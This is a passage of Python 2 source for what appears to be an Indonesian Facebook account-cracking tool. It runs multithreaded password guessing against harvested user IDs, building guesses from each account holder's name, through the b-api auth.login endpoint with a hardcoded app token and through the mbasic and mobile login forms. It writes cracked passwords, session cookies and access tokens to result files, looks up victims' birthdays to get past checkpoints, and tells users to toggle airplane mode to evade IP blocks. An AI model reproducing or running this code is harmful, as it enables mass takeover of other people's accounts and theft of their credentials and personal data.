            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
	elif suuu in ('6', '06'):
            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
            with ThreadPoolExecutor(max_workers=30) as (log):
               for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
	elif suuu in ('7', '07'):
            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
	elif suuu in ('8', '08'):
            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        else:
            print '\n%s[+] Isi yang benar kentod' % M
            self.langsung()

    def b_api(self, user, zona):
        global cp
        global loop
        global ok
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {'user-agent': ua, 'x-fb-connection-bandwidth': str(random.randint(20000, 40000)), 
               'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            bapi = 'https://b-api.facebook.com/v1.0/method/auth.login?format=json&email=&password=&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true'
            response = ses.get(bapi + '?format=json&email=' + user + '&password=' + pw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
                loop += 1
                print '\r\x1b[0;91m[!] IP terblokir. hidupkan mode pesawat 2 detik',
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r%s fir %s | %s | %s ' % (H, user, pw, response.json()['access_token'])
                ok.append('%s|%s|%s' % (user, pw, response.json()['access_token']))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s|%s\n' % (user, pw, response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s fir %s | %s | %s %s %s  ' % (K, user, pw, day, month, year)
                    cp.append('%s|%s|%s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s|%s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r%s fir %s | %s           ' % (K, user, pw)
                cp.append('%s|%s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s\n' % (user, pw))
                break
                continue

        loop += 1
        print '\r\x1b[0;97m[\x1b[0;92m%s\x1b[0;97m] \x1b[0;93m%s/%s \x1b[0;92mOk/%s \x1b[0;97m- \x1b[0;93mCp/%s > ' % (datetime.now().strftime('%H:%M:%S'), loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()

    def basic(self, user, zona):
        global loop
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com/')
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
                if rom.get('value') is None:
                    if rom.get('name') == 'email':
                        data.update({'email': user})
                    elif rom.get('name') == 'pass':
                        data.update({'pass': pw})
                    else:
                        data.update({rom.get('name'): ''})
                else:
                    data.update({rom.get('name'): rom.get('value')})

            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
               '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fdevice'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s--> %s | %s | %s  ' % (H, user, pw, coki)
                ok.append('%s|%s|%s' % (user, pw, coki))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s|%s\n' % (user, pw, kuki))
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s fir %s | %s | %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s|%s|%s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s|%s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r%s fir %s | %s            ' % (K, user, pw)
                cp.append('%s|%s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s\n' % (user, pw))
                break
                continue

        loop += 1
        print '\r\x1b[1;91m[\x1b[1;91m%s\33[1;94m] \x1b[1;94m%s/%s \x1b[1;95mOk/%s \x1b[1;95m- \x1b[1;91mCp/%s : ' % (datetime.now().strftime('%H:%M:%S'), loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()
        return

    def mobile(self, user, zona):
        global loop
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com/login.php')
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
                if rom.get('value') is None:
                    if rom.get('name') == 'email':
                        data.update({'email': user})
                    elif rom.get('name') == 'pass':
                        data.update({'pass': pw})
                    else:
                        data.update({rom.get('name'): ''})
                else:
                    data.update({rom.get('name'): rom.get('value')})

            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
               '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s--> %s | %s | %s ' % (H, user, pw, coki)
                ok.append('%s|%s|%s' % (user, pw, coki))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s|%s\n' % (user, pw, coki))
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s fir %s | %s | %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s|%s|%s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s|%s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r%s fir %s | %s              ' % (K, user, pw)
                cp.append('%s|%s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s\n' % (user, pw))
                break
                continue
        print ' loading....'
        loop += 1
        rm = random.choice(['\x1b[1;97m', '\x1b[1;96m', '\x1b[1;95m', '\x1b[1;94m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;91m'])
        print '\r\x1b[0;97m[\x1b[0;92m%s\x1b[0;97m] \x1b[0;93m%s/%s \x1b[0;92mOk/%s \x1b[0;97m- \x1b[0;93mCp/%s > ' % (datetime.now().strftime('%H:%M:%S'), loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()
        return

    def mfb(self, user, zona):
        global loop
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com/login.php')
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
                if rom.get('value') is None:
                    if rom.get('name') == 'email':
                        data.update({'email': user})
                    elif rom.get('name') == 'pass':
                        data.update({'pass': pw})
                    else:
                        data.update({rom.get('name'): ''})
                else:
                    data.update({rom.get('name'): rom.get('value')})

            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
               '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s %s | %s | %s ' % (H, user, pw)
                ok.append('%s|%s|%s' % (user, pw, coki))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s|%s\n' % (user, pw, coki))
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s %s | %s | %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s|%s|%s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s|%s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r%s fir %s | %s              ' % (K, user, pw)
                cp.append('%s|%s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s\n' % (user, pw))
                break
                continue

        loop += 1
        rm = random.choice(['\x1b[1;97m', '\x1b[1;96m', '\x1b[1;95m', '\x1b[1;94m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;91m'])
        print '\r\x1b[0;97m[\x1b[0;92m%s\x1b[0;97m] \x1b[0;93m%s/%s \x1b[0;92mOk/%s \x1b[0;97m- \x1b[0;93mCp/%s > ' % (datetime.now().strftime('%H:%M:%S'), loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()
        return


def useragent():
    print '\n%s[%s1%s] Ganti User Agent ' % (P, K, P)
    print '[%s2%s] Cek User Agent ' % (K, P)
    print '[%s0%s] Kembali Ke Menu ' % (H, P)
    uas()


def uas():
    u = raw_input('\n%s[\xe2\x80\xa2] Pilih :%s ' % (P, K))
    if u == '':
        print '%s[\xe2\x80\xa2] Isi yang benar kentod' % M
        jeda(2)
        uas()
    elif u in ('1', '01'):
        print '\n%s[%s\xe2\x80\xa2%s] ketik %sMy user agent%s di browser google chrome\n[%s\xe2\x80\xa2%s] untuk gunakan user agent anda sendiri' % (P, K, P, H, P, K, P)
        print '[%s\xe2\x80\xa2%s] ketik %sfiR%s untuk gunakan user agent bawaan script' % (K, P, H, P)
        try:
            ua = raw_input('%s[?] User Agent : %s' % (P, K))
            if ua in '':
                print '%s[\xe2\x80\xa2] Isi yang benar kentod ] ' % M
                jeda(2)
                menu()
            elif ua in ('my user agent', 'My User Agent', 'MY USER AGENT', 'My user agent'):
                jalan('%s[\xe2\x80\xa2] Anda akan di arahkan ke browser ] ' % H)
                jeda(2)
                os.system('am start https://www.google.com/search?q=My+user+agent>/dev/null')
                jeda(2)
                useragent()
            elif ua in ('fiR', 'fiR'):
                ua = 'Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405'
                open('data/ua.txt', 'w').write(ua_)
                print '\n%s[\xe2\x9c\x93] Menggunakan user agent bawaan' % H
                jeda(2)
                menu()
            open('data/ua.txt', 'w').write(ua)
            jeda(2)
            print '\n%s[\xe2\x9c\x93] Berhasil mengganti user agent' % H
            jeda(2)
            menu()
        except KeyboardInterrupt as er:
            exit('\x1b[1;91m [!] ' + er)

    elif u in ('2', '02'):
        try:
            ua_ = open('data/ua.txt', 'r').read()
            jeda(2)
            print '%s[%s\xe2\x9c\x93%s] user agent anda : %s%s' % (P, K, P, H, ua_)
            jeda(2)
            raw_input('\n%s[ %sKembali%s ] ' % (P, H, P))
            menu()
        except IOError:
            ua_ = '%s-' % M

    elif u in ('0', '00'):
        menu()
    else:
        print '%s[\xe2\x80\xa2] Isi yang benar kentod' % M
        jeda(2)
        uas()


def menu():
    os.system('clear')
    try:
        romz = open('token.txt', 'r').read()
    except IOError:
        print '%s[%s!%s] Token invalid tod ! ' % (P, M, P)
        jeda(2)
        os.system('rm -rf token.txt')
        masuk()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + romz, headers=header)
        a = json.loads(r.text)
        nama = a['name']
    except KeyError:
        print '%s[%s!%s] Token invalid tod !' % (P, M, P)
        jeda(2)
        os.system('rm -rf data/token.txt && rm -rf data/cookies')
        masuk()
    except requests.exceptions.ConnectionError:
        exit('%s[%s!%s] Ndak ada koneksi internet ! ' % (P, M, P))

    banner()
    print '%s[+]\x1b[1;91m IP Kamu   : %s\x1b[1;94m%s' % (P, IP, P)
    print '%s[+] \x1b[1;91mSetatus   : \x1b[1;94mPremium' % P
    print '%s[+] \x1b[1;91mNAMA FB   : %s\x1b[1;94m Aktif %s' % (P, nama, H)
    print "\x1b[1;94m_______________________\x1b[1;95m__________________________/ara"
    time.sleep(0.03)
    print '%s[%s01%s] Dump ID Dari Teman Publik' % (P, K, P)
    time.sleep(0.03)
    print '[%s02%s] Dump ID Dari Followers%s%s' % (K, P, H, P)
    time.sleep(0.03)
    print '[%s03%s] Dump ID Dari React Post' % (K, P)
    time.sleep(0.03)
    print '[%s04%s] %sMulai Crack %s' % (U, P, H, P)
    time.sleep(0.03)
    print '[%s05%s] Setting/Ganti User Agent' % (U, P)
    time.sleep(0.03)
    print '[%s06%s] Lihat %sResults%s Crack' % (U, P, H, P)
    time.sleep(0.03)
    time.sleep(0.03)
    print '[%s07%s] Cek Opsi Akun Checkpoin' % (H, P)
    time.sleep(0.03)
    print '[%s08%s] Gabung Grup Wa admin ' % (H, P)
    time.sleep(0.03)
    print '%s[%s09%s] Crack dari teman ' % (P, K, P)
    time.sleep(0.03)
    print '%s[%s10%s] Dump ID Dari Teman Publik 5000' % (P, K, P)
    time.sleep(0.03)
    print '[%s00%s] Keluar (%sHapus Token%s) ' % (M, P, H, P)
    time.sleep(0.03)
    fir88__sayang__araa = raw_input('\n%s[?] Pilih : %s' % (P, K))
    time.sleep(0.03)
    if fir88__sayang__araa == '':
        print '%s[\xe2\x80\xa2] Isi yang benar kentod' % M
        jeda(2)
        menu()
    elif fir88__sayang__araa in ('1', '01'):
        publik(romz)
    elif fir88__sayang__araa in ('10', '010'):
        publik(romz)
    elif fir88__sayang__araa in ('9', '09'):
        publik(romz)
    elif fir88__sayang__araa in ('2', '02'):
        followers(romz)
    elif fir88__sayang__araa in ('3', '03'):
        postingan(romz)
    elif fir88__sayang__araa in ('4', '04'):
        ngentod().araaa()
    elif fir88__sayang__araa in ('5', '05'):
        useragent()
    elif fir88__sayang__araa in ('6', '06'):
        print '\n%s[%s1%s] Hasil crack akun facebook ' % (P, K, P)
        c = raw_input('%s[%s?%s] Pilih: %s' % (P, K, P, H))
        hasill(c)
    elif fir88__sayang__araa in ('', ''):
        __firrxaraaa__()
    elif fir88__sayang__araa in ('7', '07'):
        cek_opsi()
    elif fir88__sayang__araa in ('8', '08'):
        os.system('xdg-open https://chat.whatsapp.com/HKBonl0ldcX5cCG6P8FeEM')
    elif fir88__sayang__araa in ('0', '00'):
        print ''
        tik()
        jeda(1)
        os.system('rm -rf token.txt')
        jalan('\n%s[%s\xe2\x9c\x93%s] Berhasil terhapus' % (P, H, P))
        exit()
    else:
        print '%s[\xe2\x80\xa2] Isi yang benar kentod' % K
        jeda(2)
        menu()


def hasill(c):
    if c in ('', ):
        print '%s[%s\xe2\x80\xa2%s] isi yang benar kentod' % (P, P, K)
        exit()
    else:
        if c in ('1', '01'):
            try:
                dirs = os.listdir('hasil')
                print ''
                for file in dirs:
                    print '%s[+] %s%s' % (P, B, file)
                    time.sleep(0.02)

                print '\n%s[%s\xe2\x80\xa2%s] Contoh : CP-%s-%s-%s%s' % (P, K, P, ha, op, ta, '.txt')
                file = raw_input('%s[?] Masukan nama file : ' % P)
                jeda(1)
                if file == '':
                    print '%s[!] File gak ada kentod' % K
                total = open('hasil/%s' % file).read().splitlines()
                print '%s[%s\xe2\x80\xa2%s] Hasil Crack Akun Facebook' % (P, K, P)
                jeda(2)
                nm_file = ('%s' % file).replace('-', ' ')
                jalan('[%s\xe2\x80\xa2%s] Total Akun : %s' % (K, P, len(total)))
                print '%s[%s#%s]--------------------------------------------------%s' % (P, K, P, H)
                jeda(2)
                for akun in total:
                    fb = akun.replace('\n', '')
                    tling = fb.replace('[\xc3\x97] ', '[\xc3\x97]').replace('[\xc3\x97]', '[\xc3\x97] ')
                    print tling
                    jeda(0.03)

                print '%s[%s#%s]--------------------------------------------------%s' % (P, K, P, H)
                jeda(2)
                raw_input('\n%s[ %sTekan Enter%s ]' % (P, H, P))
                menu()
            except IOError:
                print '\n%s[!] Gak Dapet Hasil Awokawok ' % K
                raw_input('\n%s[ %sTekan Enter%s ]' % (P, H, P))
                menu()

        elif c in ('2', '02'):
            print '\n%s[1] Hasil crack akun %sOK ' % (P, H)
        print '%s[2] Hasil crack akun %sCP ' % (P, K)
        while True:
            rom = raw_input('\n%s[\xe2\x80\xa2] Menu : %s' % (P, K))
            if rom in ('1', '01'):
                try:
                    oke = open('okeh.txt', 'r').readlines()
                    print '%s[%s\xe2\x80\xa2%s] Hasil Crack Akun OK' % (P, K, P)
                    jeda(2)
                    jalan('[%s\xe2\x80\xa2%s] Total Akun : %s%s' % (K, P, H, str(len(oke))))
                    print '%s[%s\xe2\x80\xa2%s]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s' % (P, K, P, H)
                    jeda(2)
                    okek = open('okeh.txt', 'r').read()
                    print okek
                    exit('%s[%s\xe2\x80\xa2%s]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % (P, K, P))
                    jeda(2)
                except IOError as KeyError:
                    exit(M + '\n[\xe2\x80\xa2] Tidak ada hasil awokawok')

            elif rom in ('2', '02'):
                try:
                    cepe = open('cepeh.txt', 'r').readlines()
                    print '%s[%s\xe2\x80\xa2%s] Hasil Crack Akun CP' % (P, K, P)
                    jeda(2)
                    jalan('[%s\xe2\x80\xa2%s] Total Akun : %s%s' % (K, P, K, str(len(cepe))))
                    print '%s[%s\xe2\x80\xa2%s]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s' % (P, K, P, H)
                    jeda(2)
                    cepek = open('cepeh.txt', 'r').read()
                    print cepek
